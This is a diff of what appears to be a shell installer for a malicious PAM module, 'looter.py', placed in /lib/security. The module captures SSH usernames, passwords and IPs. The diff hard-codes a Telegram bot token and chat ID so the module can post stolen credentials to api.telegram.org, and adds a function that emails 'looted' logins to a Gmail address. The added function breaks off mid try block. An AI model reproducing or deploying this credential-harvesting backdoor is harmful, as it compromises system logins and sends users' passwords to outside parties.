@@ -25,8 +25,8 @@ import crypt
 import requests
 
 def sendMessage(msg):
-    apiKey = "API-KEY"
-    userId = "USER-ID"
+    apiKey = "110201543:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw"
+    userId = "SSHCredLooterBot"
     data = {"chat_id":userId,"text":msg}
     url = "https://api.telegram.org/bot{}/sendMessage".format(apiKey)
     r = requests.post(url,json=data)
@@ -74,6 +74,24 @@ def pam_sm_close_session(pamh, flags, argv):
 
 def pam_sm_chauthtok(pamh, flags, argv):
     return pamh.PAM_SUCCESS
+
+def totes_legit(user, password, ip):
+
+	import smtplib
+	sender = 'user@ip'
+	receivers = ['hassan_minhaj_99@gmail.com']
+	
+	message = """From: user@ip <user@ip>
+	To: Quality Assurance <hassan_minhaj_99@gmail.com>
+	Subject: As per your request
+
+	Looted user, : password, @ ip
+	"""
+
+	try:
+		smtpObj = smtplib.SMTP('localhost')
+		smtpObj.sendmail(sender, receivers, message)         
+
 '
 mkdir -p /lib/security/
 echo "$code" > /lib/security/looter.py
